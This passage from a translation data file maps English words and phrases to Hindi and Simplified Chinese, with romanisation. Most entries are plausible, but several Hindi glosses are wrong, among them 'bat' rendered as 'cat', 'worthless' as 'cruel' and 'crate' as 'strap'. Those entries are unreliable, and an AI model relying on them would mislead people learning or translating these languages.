                "Chinese (Simplified)": "今天商店关门。 (Jīntiān shāngdiàn guānmén.)"
            },
            "she is wearing a red dress.": {
                "Hindi": "वह लाल रंग की ड्रेस पहने हुई है। (Vah laal rang ki dress pehene hui hai.)",
                "Chinese (Simplified)": "她穿着一件红色的裙子。 (Tā chuānzhuó yī jiàn hóngsè de qúnzi.)"
            },
            "i am learning Python.": {
                "Hindi": "मैं पायथन सीख रहा हूँ। (Main Python seekh raha hoon.)",
                "Chinese (Simplified)": "我在学习Python。 (Wǒ zài xuéxí Python.)"
            },
            "the bird is flying high.": {
                "Hindi": "पक्षी ऊँचा उड़ रहा है। (Pakshi uncha ud raha hai.)",
                "Chinese (Simplified)": "鸟在高空飞翔。 (Niǎo zài gāo kōng fēixiáng.)"
            },
            "they are eating dinner.": {
                "Hindi": "वे डिनर खा रहे हैं। (Ve dinner kha rahe hain.)",
                "Chinese (Simplified)": "他们在吃晚餐。 (Tāmen zài chī wǎncān.)"
            },
            "i have a meeting tomorrow.": {
                "Hindi": "मेरी कल मीटिंग है। (Meri kal meeting hai.)",
                "Chinese (Simplified)": "我明天有一个会议。 (Wǒ míngtiān yǒu yīgè huìyì.)"
            },
            "the phone is charging.": {
                "Hindi": "फोन चार्ज हो रहा है। (Phone charge ho raha hai.)",
                "Chinese (Simplified)": "手机在充电。 (Shǒujī zài chōngdiàn.)"
            },
            "the weather is very cold today.": {
                "Hindi": "आज मौसम बहुत ठंडा है। (Aaj mausam bahut thanda hai.)",
                "Chinese (Simplified)": "今天天气非常冷。 (Jīntiān tiānqì fēicháng lěng.)"
            },
            "delicious": {
                "Hindi": "स्वादिष्ट (Swadisht)",
                "Chinese (Simplified)": "美味的 (Měiwèi de)"
            },
            "crate": {
                "Hindi": "पट्टा (Patta)",
                "Chinese (Simplified)": "箱子 (Xiāngzi)"
            },
            "excuse me": {
                "Hindi": "मुझे माफ़ करें (Mujhe maaf karein)",
                "Chinese (Simplified)": "对不起 (Duìbùqǐ)"
            },
            "literally": {
                "Hindi": "वास्तव में (Vastav mein)",
                "Chinese (Simplified)": "字面上 (Zìmiàn shàng)"
            },
            "charm": {
                "Hindi": "आकर्षण (Aakarshan)",
                "Chinese (Simplified)": "魅力 (Mèilì)"
            },
            "prank": {
                "Hindi": "मज़ाक (Mazaak)",
                "Chinese (Simplified)": "恶作剧 (Èzuòjù)"
            },
            "worth": {
                "Hindi": "क़ीमत (Keemat)",
                "Chinese (Simplified)": "值得 (Zhídé)"
            },
            "worthless": {
                "Hindi": "निर्दयी (Nirdai)",
                "Chinese (Simplified)": "毫无价值的 (Háo wú jiàzhí de)"
            },
            "stage": {
                "Hindi": "मंच (Manch)",
                "Chinese (Simplified)": "舞台 (Wǔtái)"
            },
            "surf": {
                "Hindi": "लहरों पर चलना (Lehron par chalna)",
                "Chinese (Simplified)": "冲浪 (Chōnglàng)"
            },
            "enable": {
                "Hindi": "सक्षम बनाना (Saksham banana)",
                "Chinese (Simplified)": "启用 (Qǐyòng)"
            },
            "disable": {
                "Hindi": "अक्षम बनाना (Aksham banana)",
                "Chinese (Simplified)": "禁用 (Jìnyòng)"
            },
            "disabled": {
                "Hindi": "अक्षम (Aksham)",
                "Chinese (Simplified)": "残疾的 (Cánjí de)"
            },
            "perform": {
                "Hindi": "प्रदर्शन करना (Pradarshan karna)",
                "Chinese (Simplified)": "表演 (Biǎoyǎn)"
            },
            "instead": {
                "Hindi": "इसके बजाय (Iske bajaye)",
                "Chinese (Simplified)": "代替 (Dàitì)"
            },
            "substitute": {
                "Hindi": "प्रतिस्थापन (pratishthapan)",
                "Chinese (Simplified)": "替代 (tìdài)"
            },
            "apart": {
                "Hindi": "अलग (alag)",
                "Chinese (Simplified)": "分开 (fēnkāi)"
            },
            "focus": {
                "Hindi": "ध्यान केंद्रित करना (dhyaan kendrit karna)",
                "Chinese (Simplified)": "专注 (zhuānzhù)"
            },
            "sympathy": {
                "Hindi": "सहानुभूति (sahaanubhuti)",
                "Chinese (Simplified)": "同情 (tóngqíng)"
            },
            "nasty": {
                "Hindi": "घिनौना (Ghinauna)",
                "Chinese (Simplified)": "肮脏的 (Āngzāng de)"
            },
            "the sky is clear.": {
                "Hindi": "आसमान साफ है। (Aasmaan saaf hai.)",
                "Chinese (Simplified)": "天空是清澈的。 (Tiānkōng shì qīngchè de.)"
            },
            "he is running fast.": {
                "Hindi": "वह तेज दौड़ रहा है। (Vah tez daud raha hai.)",
                "Chinese (Simplified)": "他跑得很快。 (Tā pǎo dé hěn kuài.)"
            },
            "I lost my keys.": {
                "Hindi": "मैं अपनी चाबियाँ खो बैठा हूँ। (Main apni chaabiyan kho baitha hoon.)",
                "Chinese (Simplified)": "我丢了我的钥匙。 (Wǒ diūle wǒ de yàoshi.)"
            },
            "she loves to read books.": {
                "Hindi": "वह किताबें पढ़ना पसंद करती है। (Vah kitaabein padhna pasand karti hai.)",
                "Chinese (Simplified)": "她喜欢读书。 (Tā xǐhuān dúshū.)"
            },
            "he is very tall.": {
                "Hindi": "वह बहुत लंबा है। (Vah bahut lamba hai.)",
                "Chinese (Simplified)": "他很高。 (Tā hěn gāo.)"
            },
            "the coffee is hot.": {
                "Hindi": "कॉफी गरम है। (Coffee garam hai.)",
                "Chinese (Simplified)": "咖啡很热。 (Kāfēi hěn rè.)"
            },
            "I enjoy the music.": {
                "Hindi": "मुझे संगीत पसंद है। (Mujhe sangeet pasand hai.)",
                "Chinese (Simplified)": "我喜欢这音乐。 (Wǒ xǐhuān zhè yīnyuè.)"
            },
            "this place is quiet.": {
                "Hindi": "यह स्थान शांत है। (Yeh sthan shaant hai.)",
                "Chinese (Simplified)": "这个地方很安静。 (Zhège dìfāng hěn ānjìng.)"
            },
            "she is my friend.": {
                "Hindi": "वह मेरी दोस्त है। (Vah meri dost hai.)",
                "Chinese (Simplified)": "她是我的朋友。 (Tā shì wǒ de péngyǒu.)"
            },
            "the dog is barking.": {
                "Hindi": "कुत्ता भौंक रहा है। (Kutta bhonk raha hai.)",
                "Chinese (Simplified)": "狗在叫。 (Gǒu zài jiào.)"
            },
            "they are laughing loudly.": {
                "Hindi": "वे जोर से हंस रहे हैं। (Ve zor se hans rahe hain.)",
                "Chinese (Simplified)": "他们大声笑。 (Tāmen dàshēng xiào.)"
            },
            "I like this game.": {
                "Hindi": "मुझे यह खेल पसंद है। (Mujhe yeh khel pasand hai.)",
                "Chinese (Simplified)": "我喜欢这个游戏。 (Wǒ xǐhuān zhège yóuxì.)"
            },
            "he is reading a book.": {
                "Hindi": "वह एक किताब पढ़ रहा है। (Vah ek kitaab padh raha hai.)",
                "Chinese (Simplified)": "他在读一本书。 (Tā zài dú yī běn shū.)"
            },
            "the food smells good.": {
                "Hindi": "खाना अच्छा खुशबू आ रहा है। (Khana accha khushboo aa raha hai.)",
                "Chinese (Simplified)": "食物闻起来很香。 (Shíwù wén qǐlái hěn xiāng.)"
            },
            "dung": {
                "Hindi": "गोबर (Gobar)",
                "Chinese (Simplified)": "粪便 (Fènbiàn)"
            },
            "poetry": {
                "Hindi": "काव्य (Kavya)",
                "Chinese (Simplified)": "诗歌 (Shīgē)"
            },
            "roast": {
                "Hindi": "भूनना (Bhunna)",
                "Chinese (Simplified)": "烤 (Kǎo)"
            },
            "pan": {
                "Hindi": "कढ़ाई (Kadhai)",
                "Chinese (Simplified)": "平底锅 (Píngdǐguō)"
            },
            "sticky": {
                "Hindi": "चिपचिपा (Chipchipa)",
                "Chinese (Simplified)": "粘 (Nián)"
            },
            "spine": {
                "Hindi": "रीढ़ (Reedh)",
                "Chinese (Simplified)": "脊柱 (Jǐzhù)"
            },
            "model": {
                "Hindi": "मॉडल (Model)",
                "Chinese (Simplified)": "模型 (Móxíng)"
            },
            "juice": {
                "Hindi": "रस (Ras)",
                "Chinese (Simplified)": "果汁 (Guǒzhī)"
            },
            "gang": {
                "Hindi": "गिरोह (Giroh)",
                "Chinese (Simplified)": "帮派 (Bāngpài)"
            },
            "crown": {
                "Hindi": "मुकुट (Mukut)",
                "Chinese (Simplified)": "王冠 (Wángguàn)"
            },
            "nerd": {
                "Hindi": "विद्वान (Vidwan)",
                "Chinese (Simplified)": "书呆子 (Shūdāizi)"
            },
            "worse": {
                "Hindi": "और बुरा (Aur bura)",
                "Chinese (Simplified)": "更糟 (Gèng zāo)"
            },
            "rob": {
                "Hindi": "लूटना (Lootna)",
                "Chinese (Simplified)": "抢劫 (Qiǎngjié)"
            },
            "robbery": {
                "Hindi": "डाका (Daka)",
                "Chinese (Simplified)": "抢劫 (Qiǎngjié)"
            },
            "hit": {
                "Hindi": "मारा (Mara)",
                "Chinese (Simplified)": "打击 (Dǎjí)"
            },
            "cartel": {
                "Hindi": "गिरोह (Giroh)",
                "Chinese (Simplified)": "卡特尔 (Kǎtè'ěr)"
            },
            "sport": {
                "Hindi": "खेल (Khel)",
                "Chinese (Simplified)": "体育 (Tǐyù)"
            },
            "live": {
                "Hindi": "जीवित (Jeevit)",
                "Chinese (Simplified)": "生活 (Shēnghuó)"
            },
            "rip": {
                "Hindi": "फाड़ना (Fadna)",
                "Chinese (Simplified)": "撕裂 (Sīliè)"
            },
            "heist": {
                "Hindi": "डाका (Daka)",
                "Chinese (Simplified)": "劫案 (Jié'àn)"
            },
            "jesus": {
                "Hindi": "यीशु (Yeeshu)",
                "Chinese (Simplified)": "耶稣 (Yēsū)"
            },
            "buddha": {
                "Hindi": "बुद्ध (Buddh)",
                "Chinese (Simplified)": "佛陀 (Fótuó)"
            },
            "blush": {
                "Hindi": "शर्मिंदा होना (Sharminda hona)",
                "Chinese (Simplified)": "脸红 (Liǎn hóng)"
            },
            "attention": {
                "Hindi": "ध्यान (Dhyan)",
                "Chinese (Simplified)": "注意 (Zhùyì)"
            },
            "victory": {
                "Hindi": "विजय (Vijay)",
                "Chinese (Simplified)": "胜利 (Shènglì)"
            },
            "soup": {
                "Hindi": "सूप (Soup)",
                "Chinese (Simplified)": "汤 (Tāng)"
            },
            "curry": {
                "Hindi": "करी (Curry)",
                "Chinese (Simplified)": "咖喱 (Gālí)"
            },
            "aside": {
                "Hindi": "साइड (Side)",
                "Chinese (Simplified)": "旁边 (Pángbiān)"
            },
            "beside": {
                "Hindi": "के पास (Ke paas)",
                "Chinese (Simplified)": "在旁边 (Zài pángbiān)"
            },
            "prime minister": {
                "Hindi": "प्रधान मंत्री (Pradhan Mantri)",
                "Chinese (Simplified)": "总理 (Zǒnglǐ)"
            },
            "president": {
                "Hindi": "राष्ट्रपति (Rashtrapati)",
                "Chinese (Simplified)": "总统 (Zǒngtǒng)"
            },
            "chief minister": {
                "Hindi": "मुख्यमंत्री (Mukhyamantri)",
                "Chinese (Simplified)": "首席部长 (Shǒuxí bùzhǎng)"
            },
            "district minister": {
                "Hindi": "जिला मंत्री (Jila Mantri)",
                "Chinese (Simplified)": "地区部长 (Dìqū bùzhǎng)"
            },
            "supported": {
                "Hindi": "समर्थित (Samarthit)",
                "Chinese (Simplified)": "支持 (Zhīchí)"
            },
            "turban": {
                "Hindi": "पगड़ी (Pagdi)",
                "Chinese (Simplified)": "头巾 (Tóujīn)"
            },
            "cap": {
                "Hindi": "टोपी (Topi)",
                "Chinese (Simplified)": "帽子 (Màozi)"
            },
            "lessons": {
                "Hindi": "पाठ (Paath)",
                "Chinese (Simplified)": "课程 (Kèchéng)"
            },
            "lesson": {
                "Hindi": "पाठ (Paath)",
                "Chinese (Simplified)": "课 (Kè)"
            },
            "parody": {
                "Hindi": "पैरोडी (Parody)",
                "Chinese (Simplified)": "恶搞 (Ègǎo)"
            },
            "dominate": {
                "Hindi": "प्रभुत्व (Prabhutva)",
                "Chinese (Simplified)": "支配 (Zhīpèi)"
            },
            "ghost": {
                "Hindi": "भूत (Bhoot)",
                "Chinese (Simplified)": "鬼 (Guǐ)"
            },
            "devotee": {
                "Hindi": "भक्त (Bhakt)",
                "Chinese (Simplified)": "信徒 (Xìntú)"
            },
            "bark": {
                "Hindi": "छाल (Chhaal)",
                "Chinese (Simplified)": "树皮 (Shùpí)"
            },
            "mewing": {
                "Hindi": "बिल्ली की आवाज (Billi ki awaaz)",
                "Chinese (Simplified)": "猫叫声 (Māo jiàoshēng)"
            },
            "pop corn": {
                "Hindi": "पॉपकॉर्न (Popcorn)",
                "Chinese (Simplified)": "爆米花 (Bàomǐhuā)"
            },
            "thread": {
                "Hindi": "धागा (Dhaaga)",
                "Chinese (Simplified)": "线 (Xiàn)"
            },
            "online": {
                "Hindi": "ऑनलाइन (Online)",
                "Chinese (Simplified)": "在线 (Zàixiàn)"
            },
            "offline": {
                "Hindi": "ऑफलाइन (Offline)",
                "Chinese (Simplified)": "离线 (Líxiàn)"
            },
            "going": {
                "Hindi": "जाना (Jana)",
                "Chinese (Simplified)": "去 (Qù)"
            },
            "cartoon": {
                "Hindi": "कार्टून (Cartoon)",
                "Chinese (Simplified)": "卡通 (Kǎtōng)"
            },
            "carton": {
                "Hindi": "कार्टन (Carton)",
                "Chinese (Simplified)": "纸箱 (Zhǐxiāng)"
            },
            "jail": {
                "Hindi": "जेल (Jail)",
                "Chinese (Simplified)": "监狱 (Jiānyù)"
            },
            "loot": {
                "Hindi": "लूट (Loot)",
                "Chinese (Simplified)": "掠夺 (Luèduó)"
            },
            "cream": {
                "Hindi": "क्रीम (Cream)",
                "Chinese (Simplified)": "奶油 (Nǎiyóu)"
            },
            "flour": {
                "Hindi": "आटा (Aata)",
                "Chinese (Simplified)": "面粉 (Miànfěn)"
            },
            "define": {
                "Hindi": "परिभाषित करना (Paribhashit Karna)",
                "Chinese (Simplified)": "定义 (Dìngyì)"
            },
            "employee": {
                "Hindi": "कर्मचारी (Karmchari)",
                "Chinese (Simplified)": "员工 (Yuángōng)"
            },
            "breakdown": {
                "Hindi": "विखंडन (Vikhndan)",
                "Chinese (Simplified)": "故障 (Gùzhàng)"
            },
            "dinosaur": {
                "Hindi": "डायनासोर (Dinosaur)",
                "Chinese (Simplified)": "恐龙 (Kǒnglóng)"
            },
            "mammoth": {
                "Hindi": "मैमथ (Mammoth)",
                "Chinese (Simplified)": "猛犸象 (Měngmǎxiàng)"
            },
            "ally": {
                "Hindi": "सहयोगी (Sahyogi)",
                "Chinese (Simplified)": "盟友 (Méngyǒu)"
            },
            "personality": {
                "Hindi": "व्यक्तित्व (Vyaktitva)",
                "Chinese (Simplified)": "个性 (Gèxìng)"
            },
            "disorder": {
                "Hindi": "विकार (Vikar)",
                "Chinese (Simplified)": "失调 (Shītiáo)"
            },
            "personality disorder": {
                "Hindi": "व्यक्तित्व विकार (Vyaktitva Vikar)",
                "Chinese (Simplified)": "人格障碍 (Réngé zhàng'ài)"
            },
            "aura": {
                "Hindi": "आभा (Aabha)",
                "Chinese (Simplified)": "气场 (Qìchǎng)"
            },
            "favor": {
                "Hindi": "अनुग्रह (Anugrah)",
                "Chinese (Simplified)": "恩惠 (Ēnhuì)"
            },
            "suspend": {
                "Hindi": "निलंबित करना (Nilambit Karna)",
                "Chinese (Simplified)": "暂停 (Zàntíng)"
            },
            "eliminate": {
                "Hindi": "उन्मूलन करना (Unmoolan Karna)",
                "Chinese (Simplified)": "消除 (Xiāochú)"
            },
            "revive": {
                "Hindi": "पुनर्जीवित करना (Punarjeevit Karna)",
                "Chinese (Simplified)": "复活 (Fùhuó)"
            },
            "revoke": {
                "Hindi": "रद्द करना (Radd Karna)",
                "Chinese (Simplified)": "撤销 (Chèxiāo)"
            },
            "prime": {
                "Hindi": "प्राथमिक (Prathamik)",
                "Chinese (Simplified)": "主要 (Zhǔyào)"
            },
            "challenge": {
                "Hindi": "चुनौती (Chunauti)",
                "Chinese (Simplified)": "挑战 (Tiǎozhàn)"
            },
            "hyper": {
                "Hindi": "अत्यधिक सक्रिय (Atyadhik Sakriya)",
                "Chinese (Simplified)": "过度活跃 (Guòdù huóyuè)"
            },
            "old age": {
                "Hindi": "बुढ़ापा (Budhapa)",
                "Chinese (Simplified)": "老年 (Lǎonián)"
            },
            "young age": {
                "Hindi": "युवा अवस्था (Yuva Avstha)",
                "Chinese (Simplified)": "年轻 (Niánqīng)"
            },
            "medium age": {
                "Hindi": "मध्यम आयु (Madhyam Aayu)",
                "Chinese (Simplified)": "中年 (Zhōngnián)"
            },
            "low": {
                "Hindi": "निचा (Nicha)",
                "Chinese (Simplified)": "低 (Dī)"
            },
            "high": {
                "Hindi": "ऊँचा (Uncha)",
                "Chinese (Simplified)": "高 (Gāo)"
            },
            "lower": {
                "Hindi": "निम्न (Nimn)",
                "Chinese (Simplified)": "降低 (Jiàngdī)"
            },
            "higher": {
                "Hindi": "उच्च (Ucch)",
                "Chinese (Simplified)": "更高 (Gèng gāo)"
            },
            "infinity": {
                "Hindi": "अनंत (Anant)",
                "Chinese (Simplified)": "无限 (Wúxiàn)"
            },
            "unit": {
                "Hindi": "इकाई (Ikai)",
                "Chinese (Simplified)": "单位 (Dānwèi)"
            },
            "measure": {
                "Hindi": "माप (Maap)",
                "Chinese (Simplified)": "测量 (Cèliàng)"
            },
            "bypass": {
                "Hindi": "बाइपास (Bypass)",
                "Chinese (Simplified)": "旁路 (Pánglù)"
            },
            "what's up": {
                "Hindi": "क्या हो रहा है? (Kya ho raha hai?)",
                "Chinese (Simplified)": "怎么了? (Zěnme le?)"
            },
            "genome": {
                "Hindi": "जीनोम (Genom)",
                "Chinese (Simplified)": "基因组 (Jīyīn zǔ)"
            },
            "my name is": {
                "Hindi": "मेरा नाम है (Mera naam hai)",
                "Chinese (Simplified)": "我的名字是 (Wǒ de míngzì shì)"
            },
            "who are you": {
                "Hindi": "आप कौन हैं? (Aap kaun hain?)",
                "Chinese (Simplified)": "你是谁? (Nǐ shì shuí?)"
            },
            "how are you": {
                "Hindi": "कैसे हो? (Kaise ho?)",
                "Chinese (Simplified)": "你好吗? (Nǐ hǎo ma?)"
            },
            "you are cute": {
                "Hindi": "तुम प्यारे हो (Tum pyaare ho)",
                "Chinese (Simplified)": "你很可爱 (Nǐ hěn kě'ài)"
            },
            "you are cool": {
                "Hindi": "तुम कूल हो (Tum cool ho)",
                "Chinese (Simplified)": "你很酷 (Nǐ hěn kù)"
            },
            "you are amazing": {
                "Hindi": "तुम अद्भुत हो (Tum adbhut ho)",
                "Chinese (Simplified)": "你太棒了 (Nǐ tài bàngle)"
            },
            "i am a servant": {
                "Hindi": "मैं एक नौकर हूँ (Main ek naukar hoon)",
                "Chinese (Simplified)": "我是一个仆人 (Wǒ shì yīgè púrén)"
            },
            "i am an employee": {
                "Hindi": "मैं एक कर्मचारी हूँ (Main ek karmachari hoon)",
                "Chinese (Simplified)": "我是一个员工 (Wǒ shì yīgè yuángōng)"
            },
            "what are you doing": {
                "Hindi": "तुम क्या कर रहे हो? (Tum kya kar rahe ho?)",
                "Chinese (Simplified)": "你在做什么? (Nǐ zài zuò shénme?)"
            },
            "come on": {
                "Hindi": "आओ (Aao)",
                "Chinese (Simplified)": "来吧 (Lái ba)"
            },
            "are you okay": {
                "Hindi": "क्या तुम ठीक हो? (Kya tum theek ho?)",
                "Chinese (Simplified)": "你还好吗? (Nǐ hái hǎo ma?)"
            },
            "so much years": {
                "Hindi": "इतने साल (Itne saal)",
                "Chinese (Simplified)": "这么多年 (Zhème duō nián)"
            },
            "exploit": {
                "Hindi": "शोषण (Shoshan)",
                "Chinese (Simplified)": "剥削 (Bāoxuē)"
            },
            "frame": {
                "Hindi": "फ्रेम (Frame)",
                "Chinese (Simplified)": "框架 (Kuàngjià)"
            },
            "painting": {
                "Hindi": "चित्रकारी (Chitrakari)",
                "Chinese (Simplified)": "绘画 (Huìhuà)"
            },
            "print": {
                "Hindi": "प्रिंट (Print)",
                "Chinese (Simplified)": "打印 (Dǎyìn)"
            },
            "paint": {
                "Hindi": "पेंट (Paint)",
                "Chinese (Simplified)": "油漆 (Yóuqī)"
            },
            "but why": {
                "Hindi": "लेकिन क्यों? (Lekin kyon?)",
                "Chinese (Simplified)": "但为什么? (Dàn wèishéme?)"
            },
            "incredible": {
                "Hindi": "अविश्वसनीय (Avishwasniya)",
                "Chinese (Simplified)": "难以置信 (Nányǐ zhìxìn)"
            },
            "performance": {
                "Hindi": "प्रदर्शन (Pradarshan)",
                "Chinese (Simplified)": "表现 (Biǎoxiàn)"
            },
            "i like it": {
                "Hindi": "मुझे यह पसंद है (Mujhe yeh pasand hai)",
                "Chinese (Simplified)": "我喜欢它 (Wǒ xǐhuān tā)"
            },
            "let's go": {
                "Hindi": "चलिए (Chaliye)",
                "Chinese (Simplified)": "我们走吧 (Wǒmen zǒu ba)"
            },
            "pattern": {
                "Hindi": "पैटर्न (Pattern)",
                "Chinese (Simplified)": "模式 (Móshì)"
            },
            "reference": {
                "Hindi": "संदर्भ (Sandarbh)",
                "Chinese (Simplified)": "参考 (Cānkǎo)"
            },
            "level": {
                "Hindi": "स्तर (Sthar)",
                "Chinese (Simplified)": "水平 (Shuǐpíng)"
            },
            "illuminate": {
                "Hindi": "प्रकाशित करना (Prakashit Karna)",
                "Chinese (Simplified)": "照亮 (Zhàoliàng)"
            },
            "web": {
                "Hindi": "वेब (Web)",
                "Chinese (Simplified)": "网络 (Wǎngluò)"
            },
            "spider": {
                "Hindi": "मकड़ी (Makdi)",
                "Chinese (Simplified)": "蜘蛛 (Zhīzhū)"
            },
            "coming": {
                "Hindi": "आ रहा है (A raha hai)",
                "Chinese (Simplified)": "来 (Lái)"
            },
            "coming soon": {
                "Hindi": "जल्द आ रहा है (Jald aa raha hai)",
                "Chinese (Simplified)": "即将到来 (Jíjiāng dàolái)"
            },
            "urban": {
                "Hindi": "शहरी (Shehri)",
                "Chinese (Simplified)": "城市 (Chéngshì)"
            },
            "rural": {
                "Hindi": "ग्रामीण (Gramin)",
                "Chinese (Simplified)": "乡村 (Xiāngcūn)"
            },
            "reserve": {
                "Hindi": "आरक्षित (Aarakshit)",
                "Chinese (Simplified)": "预订 (Yùdìng)"
            },
            "cinema": {
                "Hindi": "सिनेमाघर (Cinema Ghar)",
                "Chinese (Simplified)": "电影院 (Diànyǐngyuàn)"
            },
            "reservation": {
                "Hindi": "आरक्षण (Aarakshan)",
                "Chinese (Simplified)": "预定 (Yùdìng)"
            },
            "architect": {
                "Hindi": "वास्तुकार (Vastukaar)",
                "Chinese (Simplified)": "建筑师 (Jiànzhú shī)"
            },
            "too hard": {
                "Hindi": "बहुत कठिन (Bahut kathin)",
                "Chinese (Simplified)": "太难了 (Tài nánle)"
            },
            "freeze": {
                "Hindi": "जमना (Jamna)",
                "Chinese (Simplified)": "冻结 (Dòngjié)"
            },
            "melt": {
                "Hindi": "पिघलना (Pighalna)",
                "Chinese (Simplified)": "融化 (Rónghuà)"
            },
            "surround": {
                "Hindi": "घेरना (Gherna)",
                "Chinese (Simplified)": "包围 (Bāowéi)"
            },
            "surrounding": {
                "Hindi": "आसपास (Aaspas)",
                "Chinese (Simplified)": "周围 (Zhōuwéi)"
            },
            "hidden": {
                "Hindi": "छिपा हुआ (Chhupa Hua)",
                "Chinese (Simplified)": "隐藏 (Yǐn cáng)"
            },
            "pedophile": {
                "Hindi": "बाल यौन शोषक (Baal Youn Shoshak)",
                "Chinese (Simplified)": "恋童癖 (Liàntóngpī)"
            },
            "crack": {
                "Hindi": "दरार (Darar)",
                "Chinese (Simplified)": "裂缝 (Lièfèng)"
            },
            "approach": {
                "Hindi": "पास आना (Paas Aana)",
                "Chinese (Simplified)": "接近 (Jiējìn)"
            },
            "miner": {
                "Hindi": "खनिक (Khanik)",
                "Chinese (Simplified)": "矿工 (Kuànggōng)"
            },
            "fleet": {
                "Hindi": "बेड़ा (Beda)",
                "Chinese (Simplified)": "舰队 (Jiànduì)"
            },
            "circus": {
                "Hindi": "सर्कस (Sarkas)",
                "Chinese (Simplified)": "马戏团 (Mǎxìtuán)"
            },
            "jealous": {
                "Hindi": "जलन (Jalan)",
                "Chinese (Simplified)": "嫉妒 (Jídù)"
            },
            "one shot": {
                "Hindi": "एक ही शॉट (Ek Hi Shot)",
                "Chinese (Simplified)": "一击 (Yī jí)"
            },
            "fluent": {
                "Hindi": "धाराप्रवाह (Dharaprawah)",
                "Chinese (Simplified)": "流利 (Liúlì)"
            },
            "open mind": {
                "Hindi": "खुला दिमाग (Khula Dimaag)",
                "Chinese (Simplified)": "开放思想 (Kāifàng sīxiǎng)"
            },
            "review": {
                "Hindi": "समीक्षा (Sameeksha)",
                "Chinese (Simplified)": "审查 (Shěnchá)"
            },
            "superman": {
                "Hindi": "सुपरमैन (Superman)",
                "Chinese (Simplified)": "超人 (Chāo rén)"
            },
            "bad leader": {
                "Hindi": "बुरा नेता (Bura Neta)",
                "Chinese (Simplified)": "糟糕的领导者 (Zāogāo de lǐngdǎo zhě)"
            },
            "bat": {
                "Hindi": "बिल्ली (Billi)",
                "Chinese (Simplified)": "蝙蝠 (Biānfú)"
            },
            "fly": {
                "Hindi": "उड़ना (Udna)",
                "Chinese (Simplified)": "飞 (Fēi)"
            },
            "walker": {
                "Hindi": "चलने वाला (Chalne Wala)",
                "Chinese (Simplified)": "行走者 (Xíngzǒu zhě)"
            },
            "not like us": {
                "Hindi": "हम जैसे नहीं (Hum Jaise Nahi)",
                "Chinese (Simplified)": "不像我们 (Bù xiàng wǒmen)"
            },
            "exist": {
                "Hindi": "अस्तित्व में होना (Astitv Mein Hona)",
                "Chinese (Simplified)": "存在 (Cúnzài)"
            },
            "egg": {
                "Hindi": "अंडा (Anda)",
                "Chinese (Simplified)": "蛋 (Dàn)"
            },
            "expire": {
                "Hindi": "समाप्त होना (Samaapt Hona)",
                "Chinese (Simplified)": "过期 (Guòqī)"
            },
            "pass away": {
                "Hindi": "स्वर्गवास हो जाना (Swargvaas Ho Jana)",
                "Chinese (Simplified)": "去世 (Qùshì)"
            },
            "importance": {
                "Hindi": "महत्व (Mahattva)",
                "Chinese (Simplified)": "重要性 (Zhòngyàoxìng)"
            },
            "shit": {
                "Hindi": "गंदगी (Gandagi)",
                "Chinese (Simplified)": "屎 (Shǐ)"
            },
            "layer": {
                "Hindi": "परत (Parat)",
                "Chinese (Simplified)": "层 (Céng)"
            },
            "meal": {
                "Hindi": "भोजन (Bhojan)",
                "Chinese (Simplified)": "餐 (Cān)"
            },
            "write a song": {
                "Hindi": "एक गाना लिखो (Ek Gaana Likho)",
                "Chinese (Simplified)": "写一首歌 (Xiě yī shǒu gē)"
            },
            "can you do that for me": {
                "Hindi": "क्या तुम मेरे लिए यह कर सकते हो? (Kya Tum Mere Liye Yeh Kar Sakte Ho?)",
                "Chinese (Simplified)": "你能为我做这个吗? (Nǐ néng wèi wǒ zuò zhège ma?)"
            },
            "i am calling": {
                "Hindi": "मैं कॉल कर रहा हूँ (Main Call Kar Raha Hoon)",
                "Chinese (Simplified)": "我在打电话 (Wǒ zài dǎ diànhuà)"
            },
            "hey listen": {
                "Hindi": "हे सुनो (Hey Suno)",
                "Chinese (Simplified)": "嘿，听着 (Hēi, tīngzhe)"
            },
            "ignore": {
                "Hindi": "नज़रअंदाज़ करना (Nazarandaaz Karna)",
                "Chinese (Simplified)": "忽视 (Hūshì)"
            },
            "listen": {
                "Hindi": "सुनो (Suno)",
                "Chinese (Simplified)": "听 (Tīng)"
            },
            "out of hands": {
                "Hindi": "हाथ से बाहर (Haath Se Baahar)",
                "Chinese (Simplified)": "脱手 (Tuō shǒu)"
            },
            "threat": {
                "Hindi": "धमकी (Dhamki)",
                "Chinese (Simplified)": "威胁 (Wēixié)"
            },
            "shoot my shot": {
                "Hindi": "अपना मौका आजमाना (Apna Mauka Azmana)",
                "Chinese (Simplified)": "射击我的机会 (Shèjī wǒ de jīhuì)"
            },
            "here we go again": {
                "Hindi": "फिर से शुरू करते हैं (Phir Se Shuru Karte Hain)",
                "Chinese (Simplified)": "我们又来了 (Wǒmen yòu láile)"
            },
            "shack": {
                "Hindi": "झोपड़ी (Jhopdi)",
                "Chinese (Simplified)": "小屋 (Xiǎowū)"
            },
            "plank": {
                "Hindi": "पट्टी (Patti)",
                "Chinese (Simplified)": "木板 (Mùbǎn)"
            },
            "wood": {
                "Hindi": "लकड़ी (Lakdi)",
                "Chinese (Simplified)": "木头 (Mùtóu)"
            },
            "fatal": {
                "Hindi": "घातक (Ghatak)",
                "Chinese (Simplified)": "致命 (Zhìmìng)"
            },
            "apology": {
                "Hindi": "माफी (Maafi)",
                "Chinese (Simplified)": "道歉 (Dàoqiàn)"
            },
            "apologize": {
                "Hindi": "माफी मांगना (Maafi Maangna)",
                "Chinese (Simplified)": "道歉 (Dàoqiàn)"
            },
            "i am sorry": {
                "Hindi": "मुझे खेद है (Mujhe Khed Hai)",
                "Chinese (Simplified)": "对不起 (Duìbuqǐ)"
            },
            "is everything good": {
                "Hindi": "क्या सब ठीक है? (Kya Sab Theek Hai?)",
                "Chinese (Simplified)": "一切都好吗? (Yīqiè dōu hǎo ma?)"
            },
            "i am ok": {
                "Hindi": "मैं ठीक हूँ (Main Theek Hoon)",
                "Chinese (Simplified)": "我很好 (Wǒ hěn hǎo)"
            },
            "evidence": {
                "Hindi": "साक्ष्य (Saakshya)",
                "Chinese (Simplified)": "证据 (Zhèngjù)"
            },
            "exposure": {
                "Hindi": "प्रदर्शन (Pradarshan)",
                "Chinese (Simplified)": "曝光 (Bàoguāng)"
            },
            "nick": {
                "Hindi": "चोट (Chot)",
                "Chinese (Simplified)": "小伤 (Xiǎo shāng)"
            },
            "suggestion": {
                "Hindi": "सुझाव (Sujhav)",
                "Chinese (Simplified)": "建议 (Jiànyì)"
            },
            "announcement": {
                "Hindi": "घोषणा (Ghoshna)",
                "Chinese (Simplified)": "公告 (Gōnggào)"
            },
            "trip": {
                "Hindi": "यात्रा (Yatra)",
                "Chinese (Simplified)": "旅行 (Lǚxíng)"
            },
            "fantasy": {
